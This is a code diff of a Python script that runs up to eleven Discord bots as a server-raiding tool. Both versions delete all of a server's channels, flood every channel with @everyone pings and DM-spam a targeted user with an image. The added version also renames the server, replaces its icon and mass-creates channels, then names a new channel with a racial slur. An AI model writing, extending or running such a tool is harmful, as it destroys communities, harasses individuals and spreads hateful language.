@@ -1,254 +1,172 @@
+import os
 import asyncio
 import discord
+from discord.ext import commands
 from discord import app_commands
-import os
-import re
-import logging
-from dotenv import load_dotenv
 
-load_dotenv()
-
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
+ALLOWED_USERS = {1491826888107364433, 1383785763501637674}
 
 PREFIX = "$$"
 
-PHOTO_PATH = "photo_1.png"
-
-# ─────────────────────────────────────────────────────────────
-# Regex that matches Discord bot invite links (any variant).
-# Matches:  discord.com/oauth2/authorize  AND
-#           discord.com/api/oauth2/authorize  AND
-#           discordapp.com/oauth2/authorize
-# ─────────────────────────────────────────────────────────────
-BOT_INVITE_PATTERN = re.compile(
-    r"discord(?:app)?\.com(?:/api)?/oauth2/authorize",
-    re.IGNORECASE,
-)
-
-BOT_CONFIGS = [
-    {"name": "bot1",  "token_env": "BOT1_TOKEN",  "id": 1492845514318676028},
-    {"name": "bot2",  "token_env": "BOT2_TOKEN",  "id": 1492845592303632384},
-    {"name": "bot3",  "token_env": "BOT3_TOKEN",  "id": 1492845711887171706},
-    {"name": "bot4",  "token_env": "BOT4_TOKEN",  "id": 1492846367582847066},
-    {"name": "bot5",  "token_env": "BOT5_TOKEN",  "id": 1493291019029057586},
-    {"name": "bot6",  "token_env": "BOT6_TOKEN",  "id": 1493541193546469426},
-    {"name": "bot7",  "token_env": "BOT7_TOKEN",  "id": 1493542593198297229},
-    {"name": "bot8",  "token_env": "BOT8_TOKEN",  "id": 1493543079528108032},
-    {"name": "bot9",  "token_env": "BOT9_TOKEN",  "id": 1493543296826347631},
-    {"name": "bot10", "token_env": "BOT10_TOKEN", "id": 1493543908637020160},
-    {"name": "bot11", "token_env": "BOT11_TOKEN", "id": 1111111111111111111},
+BOT_TOKENS = [
+    os.environ.get("BOT_TOKEN_1"),
+    os.environ.get("BOT_TOKEN_2"),
+    os.environ.get("BOT_TOKEN_3"),
+    os.environ.get("BOT_TOKEN_4"),
+    os.environ.get("BOT_TOKEN_5"),
+    os.environ.get("BOT_TOKEN_6"),
+    os.environ.get("BOT_TOKEN_7"),
+    os.environ.get("BOT_TOKEN_8"),
+    os.environ.get("BOT_TOKEN_9"),
+    os.environ.get("BOT_TOKEN_10"),
+    os.environ.get("BOT_TOKEN_11"),
 ]
 
-INVITE_BASE = "https://discord.com/api/oauth2/authorize?client_id={}&permissions=8&scope=bot%20applications.commands"
+PHOTO_PATH = "photo_1.png"
 
 
-def get_other_bot_invites(exclude_id: int) -> str:
-    lines = []
-    for config in BOT_CONFIGS:
-        if config["id"] != exclude_id:
-            lines.append(f"**{config['name']}** → {INVITE_BASE.format(config['id'])}")
-    return "\n".join(lines)
+def is_allowed(user_id: int) -> bool:
+    return user_id in ALLOWED_USERS
 
 
-class PingBot(discord.Client):
-    def __init__(self, bot_name: str, *, intents: discord.Intents):
-        super().__init__(intents=intents)
-        self.bot_name = bot_name
-        self.tree = app_commands.CommandTree(self)
-        self._running_loops: dict[int, asyncio.Task] = {}
-        self._last_create_name: str = "raided"
-        self._add_slash_commands()
-
-    def _add_slash_commands(self):
-        @self.tree.command(name="hi", description="Say hi")
-        async def hi_cmd(interaction: discord.Interaction):
-            await interaction.response.send_message("hi again")
-
-    async def setup_hook(self):
-        await self.tree.sync()
-        logger.info(f"[{self.bot_name}] Global slash commands synced.")
-
-    async def on_ready(self):
-        logger.info(f"[{self.bot_name}] Logged in as {self.user} (ID: {self.user.id})")
-        for guild in self.guilds:
-            try:
-                self.tree.copy_global_to(guild=guild)
-                await self.tree.sync(guild=guild)
-                logger.info(f"[{self.bot_name}] Commands synced to: {guild.name}")
-            except Exception as e:
-                logger.warning(f"[{self.bot_name}] Guild sync failed for {guild.id}: {e}")
-
-    async def on_guild_join(self, guild: discord.Guild):
-        logger.info(f"[{self.bot_name}] Joined new guild: {guild.name} ({guild.id})")
-        try:
-            self.tree.copy_global_to(guild=guild)
-            await self.tree.sync(guild=guild)
-        except Exception as e:
-            logger.warning(f"[{self.bot_name}] Sync failed for new guild {guild.id}: {e}")
-
-        channel = guild.system_channel or next(
-            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
-            None
-        )
-        if channel and self.user:
-            invites = get_other_bot_invites(exclude_id=self.user.id)
-            if invites:
-                await channel.send(
-                    f"**{self.bot_name}** joined! Add the other bots too:\n{invites}"
-                )
-
-    async def on_message(self, message: discord.Message):
-        if message.author.bot:
-            return
-
-        if not message.content.startswith(PREFIX):
-            return
-
-        raw = message.content[len(PREFIX):].strip()
-        cmd = raw.lower()
-
-        if cmd.startswith("setup"):
-            parts = cmd.split()
-            if len(parts) < 2:
-                await message.channel.send("Usage: `$$setup <number of pings>`")
-                return
-            try:
-                count = int(parts[1])
-            except ValueError:
-                await message.channel.send("Number must be an integer.")
-                return
-            channel = message.channel
-            task_key = channel.id
-            if task_key in self._running_loops:
-                await message.channel.send("Already running in this channel. Use `$$stop` to stop.")
-                return
-            task = asyncio.create_task(self._everyone_loop(channel, count))
-            self._running_loops[task_key] = task
-            await message.channel.send(f"Starting {count} @everyone pings in {channel.mention}!")
-
-        elif cmd == "stop":
-            task_key = message.channel.id
-            task = self._running_loops.pop(task_key, None)
-            if task:
-                task.cancel()
-                await message.channel.send("Stopped.")
-            else:
-                await message.channel.send("Nothing is running in this channel.")
-
-        elif cmd == "clear":
-            guild = message.guild
-            if guild is None:
-                return
-            all_channels = list(guild.channels)
-            await message.channel.send(f"Clearing all {len(all_channels)} channels...")
-
-            await asyncio.gather(
-                *[self._safe_delete_channel(c) for c in all_channels],
-                return_exceptions=True
-            )
-
-            try:
-                await guild.create_text_channel("hi da punda")
-                logger.info(f"[{self.bot_name}] Created 'hi da punda' in {guild.name}")
-            except Exception as e:
-                logger.warning(f"[{self.bot_name}] Could not create 'hi da punda': {e}")
-
-        elif cmd.startswith("doit "):
-            if not message.mentions:
-                await message.channel.send("Usage: `$$doit <@user> <number>`")
-                return
-            parts = raw.split()
-            if len(parts) < 3:
-                await message.channel.send("Usage: `$$doit <@user> <number>`")
-                return
-            try:
-                count = int(parts[-1])
-            except ValueError:
-                await message.channel.send("Number must be an integer.")
-                return
-            target_user = message.mentions[0]
-            asyncio.create_task(self._dm_spam(target_user, count))
-            await message.channel.send(f"DMing {target_user.mention} {count} time(s)!")
-
-    async def _safe_delete_channel(self, channel: discord.abc.GuildChannel):
-        try:
-            await channel.delete()
-        except Exception as e:
-            logger.warning(f"[{self.bot_name}] Could not delete #{channel.name}: {e}")
-
-    async def _dm_spam(self, user: discord.User, count: int):
-        for i in range(count):
-            try:
-                if os.path.exists(PHOTO_PATH):
-                    with open(PHOTO_PATH, "rb") as f:
-                        file = discord.File(f, filename="photo_1.png")
-                    await user.send("@everyone", file=file)
-                else:
-                    await user.send("@everyone")
-                await asyncio.sleep(0.1)
-            except discord.Forbidden:
-                logger.warning(f"[{self.bot_name}] Cannot DM {user} — DMs closed.")
-                break
-            except Exception as e:
-                logger.error(f"[{self.bot_name}] DM error: {e}")
-                break
-
-    async def _everyone_loop(self, channel: discord.TextChannel, count: int):
-        sent = 0
-        while sent < count:
-            try:
-                await channel.send("@everyone")
-                sent += 1
-                await asyncio.sleep(1)
-            except asyncio.CancelledError:
-                break
-            except discord.NotFound:
-                logger.warning(f"[{self.bot_name}] #{channel.name} deleted, stopping loop.")
-                break
-            except discord.HTTPException as e:
-                retry = getattr(e, "retry_after", 5)
-                logger.warning(f"[{self.bot_name}] Rate limited in #{channel.name}, waiting {retry}s")
-                await asyncio.sleep(retry)
-            except Exception as e:
-                logger.error(f"[{self.bot_name}] Error in everyone loop: {e}")
-                await asyncio.sleep(1)
-        self._running_loops.pop(channel.id, None)
-        logger.info(f"[{self.bot_name}] Finished sending {sent} @everyone pings in #{channel.name}")
-
-
-async def run_bot(token: str, bot_name: str):
+def make_bot(index: int) -> commands.Bot:
     intents = discord.Intents.default()
     intents.message_content = True
-    while True:
+    intents.guilds = True
+    intents.members = True
+
+    bot = commands.Bot(command_prefix=PREFIX, intents=intents)
+    bot._bot_index = index
+
+    @bot.event
+    async def on_ready():
         try:
-            client = PingBot(bot_name=bot_name, intents=intents)
-            async with client:
-                await client.start(token)
-        except discord.HTTPException as e:
-            wait = 60
-            logger.warning(f"[{bot_name}] HTTP error on login ({e.status}), retrying in {wait}s...")
-            await asyncio.sleep(wait)
+            synced = await bot.tree.sync()
+            print(f"[Bot {index+1}] Logged in as {bot.user} | Synced {len(synced)} slash commands")
         except Exception as e:
-            logger.error(f"[{bot_name}] Unexpected error: {e}, retrying in 30s...")
-            await asyncio.sleep(30)
+            print(f"[Bot {index+1}] Failed to sync slash commands: {e}")
+
+    @bot.tree.command(name="hi", description="Say hi!")
+    async def slash_hi(interaction: discord.Interaction):
+        if not is_allowed(interaction.user.id):
+            await interaction.response.send_message("You are not allowed to use this bot.", ephemeral=True)
+            return
+        await interaction.response.send_message("hi again")
+
+    @bot.command(name="clear")
+    async def prefix_clear(ctx: commands.Context):
+        if not is_allowed(ctx.author.id):
+            await ctx.send("You are not allowed to use this command.")
+            return
+        guild = ctx.guild
+        if guild is None:
+            await ctx.send("This command must be used in a server.")
+            return
+        for channel in list(guild.channels):
+            try:
+                await channel.delete()
+            except Exception as e:
+                print(f"[Bot {index+1}] Could not delete channel {channel.name}: {e}")
+        try:
+            await guild.create_text_channel("nigga")
+        except Exception as e:
+            print(f"[Bot {index+1}] Could not create channel: {e}")
+
+    @bot.command(name="create")
+    async def prefix_create(ctx: commands.Context, name: str, num: int):
+        if not is_allowed(ctx.author.id):
+            await ctx.send("You are not allowed to use this command.")
+            return
+        guild = ctx.guild
+        if guild is None:
+            await ctx.send("This command must be used in a server.")
+            return
+        try:
+            await guild.edit(name=name)
+        except Exception as e:
+            print(f"[Bot {index+1}] Could not rename server: {e}")
+
+        try:
+            with open(PHOTO_PATH, "rb") as f:
+                icon_data = f.read()
+            await guild.edit(icon=icon_data)
+        except Exception as e:
+            print(f"[Bot {index+1}] Could not change server icon: {e}")
+
+        for i in range(num):
+            try:
+                await guild.create_text_channel(f"{name}-{i+1}")
+            except Exception as e:
+                print(f"[Bot {index+1}] Could not create channel {name}-{i+1}: {e}")
+
+        try:
+            await ctx.send(f"Created {num} channel(s) named '{name}-1' through '{name}-{num}', renamed server to '{name}', and updated the server icon.")
+        except Exception:
+            pass
+
+    @bot.command(name="setup")
+    async def prefix_setup(ctx: commands.Context, number: int):
+        if not is_allowed(ctx.author.id):
+            await ctx.send("You are not allowed to use this command.")
+            return
+        guild = ctx.guild
+        if guild is None:
+            await ctx.send("This command must be used in a server.")
+            return
+        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
+        for channel in text_channels:
+            for _ in range(number):
+                try:
+                    await channel.send("@everyone")
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    print(f"[Bot {index+1}] Could not send to {channel.name}: {e}")
+
+    @bot.command(name="dmit")
+    async def prefix_dmit(ctx: commands.Context, user: discord.Member, number: int):
+        if not is_allowed(ctx.author.id):
+            await ctx.send("You are not allowed to use this command.")
+            return
+        if not os.path.exists(PHOTO_PATH):
+            await ctx.send(f"Photo file '{PHOTO_PATH}' not found.")
+            return
+        for _ in range(number):
+            try:
+                with open(PHOTO_PATH, "rb") as f:
+                    file = discord.File(f, filename="photo_1.png")
+                await user.send("@everyone", file=file)
+                await asyncio.sleep(0.5)
+            except Exception as e:
+                print(f"[Bot {index+1}] Could not DM {user}: {e}")
+        try:
+            await ctx.send(f"Sent {number} DM(s) to {user.mention}.")
+        except Exception:
+            pass
+
+    return bot
+
+
+async def run_bot(bot: commands.Bot, token: str, index: int):
+    try:
+        await bot.start(token)
+    except Exception as e:
+        print(f"[Bot {index+1}] Failed to start: {e}")
 
 
 async def main():
-    bot_tasks = []
-    for config in BOT_CONFIGS:
-        token = os.getenv(config["token_env"])
+    tasks = []
+    for i, token in enumerate(BOT_TOKENS):
         if not token:
-            print(f"[WARNING] {config['token_env']} is not set — skipping {config['name']}")
+            print(f"[Bot {i+1}] No token found, skipping.")
             continue
-        bot_tasks.append(run_bot(token=token, bot_name=config["name"]))
+        bot = make_bot(i)
+        tasks.append(asyncio.create_task(run_bot(bot, token, i)))
 
-    if not bot_tasks:
-        print("No bot tokens found. Please set BOT1_TOKEN through BOT11_TOKEN.")
+    if not tasks:
+        print("No bot tokens configured. Set BOT_TOKEN_1 through BOT_TOKEN_11 as environment secrets.")
         return
 
-    print(f"Starting {len(bot_tasks)} bot(s)...")
-    await asyncio.gather(*bot_tasks)
+    await asyncio.gather(*tasks)
 
 
 if __name__ == "__main__":
